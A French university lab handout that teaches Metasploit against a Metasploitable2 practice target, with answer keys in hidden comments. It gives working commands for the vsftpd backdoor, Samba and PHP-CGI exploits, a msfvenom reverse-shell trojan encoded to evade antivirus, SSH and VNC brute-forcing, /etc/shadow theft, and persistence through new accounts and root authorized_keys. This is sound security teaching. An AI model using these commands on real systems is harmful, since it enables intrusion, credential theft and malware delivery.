<!--

TODO avant de lancer le TP :

Pour lancer une machine metasploitable2

o Instancier une VM snap-docker-ready
o docker pull tleemcjr/metasploitable2
o docker run --name metasploitable2 -it \
-p 21:21 -p 6200:6200 -p 80:80 -p 2222:22 -p 5900:5900 -p 139:139 -p 445:445 \
tleemcjr/metasploitable2:latest sh -c "/bin/services.sh && bash"

Usage of /:   43.8% of 9.52GB 
o ouvrir les ports (Security groups):
	21,6200
	139,445
	80,4444
	2222
	



-->



# TP Metasploit

> Responsables : Jp Gelas, Thomas Begin
> Version : 0.1a (10/2020)

- - - 

**Objectif :** Découvrir et prendre en main les fonctionnalités de base du framework Metasploit.

<!-- ![Metasploit](img/metasploit.png) -->
```text
                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .
```

<!-- -->

Metasploit est un framework qui aide à trouver et à exploiter des vulnérabilités.

Le framework Metasploit est l'un des outils de test les plus utiles dont
disposent les professionnels de la sécurité (les pentesteurs). Grâce à
Metasploit, vous pouvez accéder aux exploits divulgués pour une grande variété
d'applications et de systèmes d'exploitation. Vous pouvez automatiquement
analyser, tester et exploiter des systèmes en utilisant du code que d'autres
pentesteurs, hackers ou pirates ont écrit.

Metasploit fournit également une plateforme de développement qui vous permet d'écrire vos propres outils de sécurité ou d'exploiter du code. Nous n'aborderons pas cette partie dans ce TP.

> Ce TP est une introduction aux bases de l'utilisation de Metasploit. A savoir,
> comment  utiliser le framework et exploiter une vulnérabilité.

### Démarrage de Metasploit

Instancier une VM avec l'image `Kali Linux 2020.3` sur `cloud-info.univ-lyon1.fr`.
Créez un nouveau volume de 30GB a supprimer lors de la destruction de la VM.
Selectionner un *flavor* `m1.small`, votre clé SSH si vous en aviez plusieurs et le cas échéant un *vlan*. 
L'image *kali* contient le framework Metasploit pré installé. 
Notez que la distribution *Kali Linux* vient avec Metasploit pré installé.

Pour vous connecter à la VM avec le login `kali` vous saisirez la commande suivante : `ssh -i ~/maclé kali@adresseIPdeMaVM`.
Notez que pour devenir root sur cette distribution le mot de passe est **toor** (exemple: `su -` ou `sudo su -` pour ne pas avoir à taper de mot de passe).

Pour lancer le framework il suffit de saisir la commande `msfconsole` dans un terminal (Attention c'est lent la premiére fois). 
L'invite devient `msf5>`. 

Combien d'exploits sont mis à votre disposition ?

<!-- plus de 2000 -->

```text
  
```

La première commande que vous pouvez saisir est la commande `help` qui permet d'afficher le menu d'aide (et `banner` pour le fun).


```
$ msfconsole
msf> help
...
```

Vous pouvez ensuite saisir la commande `search` pour obtenir la liste du ou des
modules en lien avec le mot clé que vous passerez en paramètre.  Par exemple la
commande suivante listera tous les scripts et exploits en lien avec MySql.

```
msf> search mysql
```

**Astuce :** La commande `help search` permet d'obtenir la liste des filtres
qui peuvent être utilisé avec la commande `search`.

La commande `info` affiche des informations supplémentaires.

```
msf> info exploit/linux/http/librenms_collectd_cmd_inject
```

Une fois que vous avez décidé quel module utiliser, saisissez la commande `use`
pour le selectionner. Cela modifiera le contexte de vos commandes et vous
permettra d'exécuter des commandes spécifiques à ce module.

```text
msf> use exploit/linux/http/librenms_collectd_cmd_inject
msf exploit(linux/http/librenms_collectd_cmd_inject) >
```

### Exploiter des vulnerabilités avec Metasploit

Maintenant que vous êtes à l'intérieur d'un module, saisissez la commande
`options` pour voir ce que vous pouvez configurer avec la commande `set`.


```text
msf exploit(linux/http/librenms_collectd_cmd_inject) > options
...
msf exploit(linux/http/librenms_collectd_cmd_inject) > set RHOSTS 192.168.1.254
```
Vous devrez définir toutes les variables requises (*Required: yes*) avant de
pouvoir exécuter l'exploit.  Une fois vos *settings* terminé vous pouvez saisir
à nouveau la commande `options` pour vérifier la bonne prise en compte de vos
paramètres.

Dans Metasploit, `LHOST`, `RHOST` ou ``RHOSTS` et `SRVHOST` sont parmi les noms
de variables les plus couramment utilisés. 

  - `LHOST` fait référence à l'adresse IP de votre machine, qui est généralement utilisée pour créer une connexion inverse à votre machine une fois l'attaque réussie. 
  - `RHOST` fait référence à l'adresse IP de l'hôte cible (ou des hôtes cibles pour `RHOSTS`). 
  - `SRVHOST` est l'adresse à laquelle le module se connectera pour télécharger des *payloads* supplémentaires (non utilisé dans ce TP).

Enfin, une fois la configuration terminée, vous pouvez lancer la commande
`exploit` ou `run` pour lancer l'exploit !

```
msf exploit(linux/http/librenms_collectd_cmd_inject) > exploit
```
--- 

# A vous de jouer

A présent à vous de jouer.

Notez l'adresse IP de la machine cible (demandez la à vos enseignants). 
Vous initialiserez plus tard la variable `RHOST` avec cette adresse.
 
```text
_____ . _____ . _____ . _____ 
```
  
Lancez un scan sur la cible avec la commande `nmap`. 
Quelle(s) option(s) utilisez vous pour obtenir la liste des ports ouverts, le nom du service et sa version ?
  <!-- nmap -sV @IPtarget -->

```text
$ nmap ..........  _____ . _____ . _____ . _____
```

---

### Exploit 1 : Exploitation d'une backdoor (vsftpd) 

<!--
https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
-->
  
  Relevez le nom et la version du service ftp (21/tcp).
  <!-- vsftpd 2.3.4 -->
```text
  
```

Quelle commande de recherche allez vous saisir dans la console de Metasploit
pour savoir si un (ou plusieurs) exploits sont disponibles pour exploiter ce
service ftp en particulier.

<!-- search vsftpd -->

```text
  
```

Quelle est le résultat ? (notez le chemin et nom du module, date, rang,...)

<!-- exploit/unix/ftp/vsftpd_234_backdoor 2011 excellent -->

```text
  
```

Comment obtenir plus d'information sur cet exploit dans la console msf ?

<!-- info  exploit/unix/ftp/vsftpd_234_backdoor -->

```text
  
```

Notez dans la section _Basic options_ quelles sont les variables que vous
devrez configurer ?

<!--  RHOST -->

```text
  
```

Sélectionnez l'exploit avec la commande `use`. L'invite de la ligne de commande a t-il changé ?
<!-- use exploit/unix/ftp/vsftpd_234_backdoor -->
<!-- msf exploit(vsftpd_234_backdoor)>_ -->

```text
  
```

Initialisez `RHOSTS` avec `set` puis lancez l'exploit.

<!-- set RHOSTS @IPtarget ; exploit -->

```text
  
```

Un lien de communication devrait être établi entre la machine attaquante (msf) et 
la machine  cible (vsftpd). Remarquez que le port utilisé est différent de 21 
(port ftp standard).

Bien que l'invite soit nul, vous pouvez saisir des commandes (ex: `ls`, `pwd`, ...)


**Astuce** : Pour avoir un invite plus sympthique, la commande suivante *spawn*
un pseudo-terminal `python -c 'import pty; pty.spawn("/bin/bash")'`. 

Quelles commandes saisir pour connaitre votre rôle (ou niveau de privilège) sur la cible ?

<!-- id ; whoami -->

```text
  
```

Récupérez la version hashée des mots de passe. Vous pourrez l'utiliser plus
tard avec un dictionnaire et un outil comme john (the ripper). 

<!--  cat /etc/shadow -->

```text
  
```

Profitez-en également pour vous assurez un retour facile sur cette machine
compromise en vous créant un compte (pas très discret) 

<!-- adduser hacker OU useradd -m -d /home/hacker -c "" -s /bin/bash hacker 
  -m = create home 
  -s = shell 
  -->

```text

```

Déconnectez vous de la machine cible.

**Lien :** Plus d'informations sur cet exploit ([lien](https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec18/vulnerability-analysis-of-vsftpd-2-3-4-backdoor)) et aller au-delà...


---

### Exploit 2 : Exploitation d'un service Samba

Le résultat du scan précédent laisse apparaitre l'exposition d'un service Samba
(sur les ports 139 et 445) qui est la version libre du système de partage de
fichier de Windows. 

Réalisez un scan qui vous permettra d'obtenir la version de Samba (module
`smb_version` des outils auxiliaire de Metasploit)

```text
use ...
options
set ...
run
```

Notez la version de Samba retournée par l'exécution du module ci-dessus (`smb_version`).
<!-- 3.0.20 -->
```text

_____ . _____ . _____

```


Hors de la console msf (dans un autre terminal), utilisons l'outil
`searchsploit` (disponible sur Kali).  Cet outil permet d'effectuer des
recherches dans la base de données [exploit-db](https://exploit-db.com) (qui
référence divers exploits et techniques d'attaques) en ligne de commande.
Existe t'il un exploit relatif à cette version de Samba ?

```text
searchsploit samba | grep _____ . _____ . _____

```

A présent, dans la console *msf* recherchez un exploit qui correspondrait aux
mots clé retourné par *searchsploit*.

<!-- grep samba search username map script-->

```text


```

Une fois trouvé, utilisez l'exploit 

<!-- 
	use exploit/multi/samba/username_map_script 
-->

```text
use ...
options
set ...
run
 
```


Cela devrait avoir pour effet de lancer un shell (minimaliste). 
Tapez des commandes comme *ls* ou *id* pour vérifier.

Faite alors `Ctrl-Z` ou saisissez la commande `background`. Cela aura pour effet
de vous proposer de mettre la session en *background*. Vous pouvez listez
toutes les sessions en background avec la commande `sessions` et vous
reconnectez à une session avec la commande `sessions` suivi du numéro de
session. Essayez.

```text
background
y (pour yes)
sessions -l
sessions -i 1
```

Enfin profitez-en pour vous assurer un retour facile sur cette machine
compromise en vous créant par exemple un accès plus discret en ajoutant votre
clé publique ssh au fichier *authorized_keys* du compte root.

**Astuce :** Utilisez la commande `echo` avec une redirection `>>`.


<!-- 
 ssh_keygen (sur la Kali)

 (sur la cible)
 echo "copiercollerclepublique" >> /root/.ssh/authorized_keys
 
 (sur la kali)
 ssh -i id_rsa root@_IP cible_
-->

```text





```

---

### Exploit 3 : Service Web vulnerable (php + meterpreter)

<!-- Verifier le bon demarrage de Apache2 :  service apache2 start -->

<!-- -->

Essayont d'abord de déterminer quelle version de PHP est utilisé sur la machine cible.
L'outil `dirb` permet de vérifier la présence d'un fichier `phpinfo.php`. 

```
dirb http://adresseMachineCible
```

Appelez ensuite ce fichier avec votre navigateur. Quelle version est utilisée ?
<!-- 5.2.4 -->
```text
    ___ . ___ . ___
```
Cette version PHP est connue pour être vulnerable à *PHPCGI Argument Injection*.

Quelles sont les arguments à passer à la commande `search` pour retrouver le nom exact de ce module sachant 
qu'il date de 2012 (*cve:2012*) et qu'il est classé comme excellent (*rank: excellent*).

<!-- search cve:2012 rank:excellent php cgi argument injection -->

```text
search ...
```

Utilisez le framework pour exploiter cette vulnerabilité.
<!-- 
use exploit/multi/http/php_cgi_arg_injection
set RHOST @IPcible
show payloads
set payload php/meterpreter/reverse_tcp
set LHOST @IPattaquant
run
meterpreter > shell
-->
```text
  



```

**Note :** La commande `show payloads` affiche la liste des payloads pour cet exploit. 
Utilisez le payload par défaut `php/meterpreter/reverse_tcp`. 

Une fois l'exploit lancé (avec la commande `run` ou `exploit`) 
vous devriez vous retrouver dans un shell *meterpreter*.  

> *Meterpreter* est un outil qui simplifie la phase de post-exploitation. C'est
> plus exactement une charge utile (un *payload*) particulièrement avancée
> permettant de simplifier la phase de post-exploitation grâce à la mise à
> disposition d’un shell interactif.  Ce payload, entièrement exécuté en
> mémoire, intègre de nombreuses fonctionnalités, par exemple télécharger des fichiers,
> lancer un *keylogger*, prendre des captures d’écran, etc.... Meterpreter est
> principalement disponible pour les cibles Windows.  Néanmoins, il existe
> aussi des payloads permettant d’obtenir une session Meterpreter sous Linux et MacOS.


Tapez les commandes `help`, `sysinfo`, `getuid`, 
`shell`,...
 


<!--
Notez que deux *payload* sont fondamentaux.

  - `...bind_tcp` : connection direct de la machine attaquante vers la machine cible.
  - `...reverse_tcp` : la machine cible exécute le payload et se connecte à la machine attaquante.
-->


#### Defacing 
Modifiez la page web d'accueil (index.php) en y inscrivant un message de propagande 
amusant (Ex: Vive les pingouins !).

<!-- sed -i -e 's/Warning/Hacked/g index.php -->

---

### Exploit 4 : Cheval de Troie (msfvenom)

L'outil `msfvenom` est inclus dans le framework metasploit. Il est la fusion
des anciens outils *msfpayload* et *msfencode*.  `msfvenom` nous servira à la
création sur mesure de payload avec possibilité d'encodage (voir même
multi-encodage) pour échapper aux antivirus par exemple.

L'outil se lance dans un terminal. Sa documentation est accessible avec l'option `-h`.

```text
msfvenom -h
```

msfvenom propose un grand nombre de **payload** (`msfvenom --list payload`).

**Astuce** : Pour connaitre les options requise à un payload, vous pouvez utiliser la *msfconsole*.

Créez et spécifiez un payload (`-p linux/x86/meterpreter/reverse_tcp`) et son format (`-f elf`). Remarquez sa taille.
La commande ci-dessous devrait génèrer un binaire au format *elf* nommé *runmeplz*.

<!-- msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=@IPattaquant LPORT=4444 -f elf > runmeplz -->

```text
msfvenom -p ....................... -f ... LHOST=____.____.____.____ LPORT=.... > runmeplz
```

À présent, dans la *msfconsole* nous allons lancer le module d'écoute en le paramétrant avec les mêmes
 paramétres que ceux utilisés pour générer notre payload ci-avant.

```text
use exploit/multi/handler 
set payload linux/x86/meterpreter/reverse_tcp
set LPORT 4444
set LHOST ____.____.____.____ #IP attaquant (kali)
show info
exploit -j -z
```

Vérifiez que votre machine écoute sur le port 4444 avec la commande `ss -ant`.
Nous voilà prêt à recevoir une connexion en provenance de la victime.

Déployez/Copiez et lancez le payload `runmeplz` sur la machine cible (par le
moyen de votre choix).  

> En pratique *runmeplz* pourrait être envoyé par email en pièce jointe à la victime. 
> Puis vous inciteriez la victime à exécuter ce binaire sur son poste de travail.

<!-- scp -P 2222 runmeplz msfadmin@192.168.239.113: -->

Connectez vous à la nouvelle session qui apparait dés que la victime a lancé votre cheval de Troie (Trojan).
Une fois la console `meterpreter` démarrée vous pouvez commencer une nouvelle phase de post-exploitation.

```text
meterpreter> help
meterpreter> sysinfo
...
```

#### A propos d'encodage

Pour rendre le code d'un binaire (ou d'un script) malveillant moins facile à
détecter par un antivirus on utilise un encodeur.  L'objectif d'un encodeur est
de modifier le code du payload sans pour autant en modifier son fonctionnement.

Vous pouvez vérifier l'efficacité d'un encodage appliqué à votre binaire sur
[virustotal.com](http://virustotal.com) par exemple.

Sans encodage (payload brut), combien d'antivirus détecte que votre payload est un *Trojan* ?

A présent appliquez un (ou plusieurs) encodage lors de la génération de votre fichier *runmeplz*.  

```text
msfvenom --list encoders 
```

Nous vous recommandons a minima l'encodeur *shikata ga nai* (option `-e` de *msfvenom*). Vérifiez
l'efficacité de votre encodage sur *virustotal.com*. Que constatez-vous ?

---

### Exploit 5 : Scanner (smb_enumusers) et bruteforce

Nous allons utiliser un module de metasploit permettant de récupérer
des informations (*data gathering*) sur le serveur Samba qui semble être disponible 
sur la machine cible (port 139). 

```text
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS ___.___.___.___
run
```
Vous devriez obtenir une liste de nom d'utilisateurs (*msfadmin, klog, sys, user, service,...*).

En vous appuyant par exemple sur le dictionnaire *rockyou.txt* (disponible sur Kali dans
`/usr/share/wordlists/`) et un outil comme *hydra* ou
*ncrack* tentez de déterminer le mot de passe du compte **klog** sur le service
*ssh* (**ATTENTION !** Exceptionnellement ssh est sur le port **2222**).

<!-- 
hydra -l klog -P /usr/share/wordlists/rockyou.txt 192.168.239.113 -s 2222 ssh #(OK)

patator ssh_login user=klog password=FILE0 0=./rockyou.txt host=@IPcible \
 -x ignore:mesg='Authentication failed.' #(KO car on ne peut pas spécifier le port 2222)

ncrack 192.168.239.113 -p ssh:2222 --user klog -P /usr/share/wordlists/rockyou.txt #(OK)
-->

---

<!-- -->

### Exploit 6 : VNC (port 5900)

Un dernier exploit pour la route. Découvrez quel mot de passe est associé au
compte *root* du service VNC qui tourne sur la machine cible. Vous utiliserez
pour cela le module `vnc_login`.


```text
use auxiliary/scanner/vnc/vnc_login
set RHOSTS @IPcible
set USERNAME root
run
```

Quel mot de passe est associé à ce username (root) ?

```text
Login successful : ___________
```
Validez ces *credentials* dans un terminal avec la commande `vncviewer`.

```text
vncviewer @IPcible
Mot de passe : ___________
```

<!-- ne pas oubliez l'option -X pour la connexion ssh à la Kali -->

---

# Conclusion

Dans ce TP nous avons vu quelques fonctionnalités du framework Metasploit.
C'est un outil puissant néanmoins tous les exploits peuvent être réalisé sans
l'usage de Metasploit. Cela demande alors généralement un peu plus
d'investissement de la part du pentesteur.
Nous avons également vu (trop) rapidement l'interpreteur *Meterpreter*. C'est
un outil qui peut s'averer redoutable notamment quand la cible est un poste
Windows (prise de contrôle de la caméra, du micro et keylogging).  

Enfin certaines attaques vues dans ce TP sont bien trop *bruyantes* pour être
réalistes dans un réseau administré correctement. Néanmoins nous avons  aussi vu
des outils qui ne laissent pas ou peu de trace sur la machine victime.
Enfin un autre point non abordé dans ce TP est la notion de *pivoting* qui
consiste a utiliser une première machine compromise pour attaquer d'autres
machines initialement inaccessible.

```text

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


```
<!--
nmap -sV 172.17.0.2

Starting Nmap 7.60 ( https://nmap.org ) at 2020-10-23 06:55 UTC
Nmap scan report for 172.17.0.2
Host is up (0.000093s latency).
Not shown: 980 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  rmiregistry GNU Classpath grmiregistry
1524/tcp open  ingreslock?
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
-->

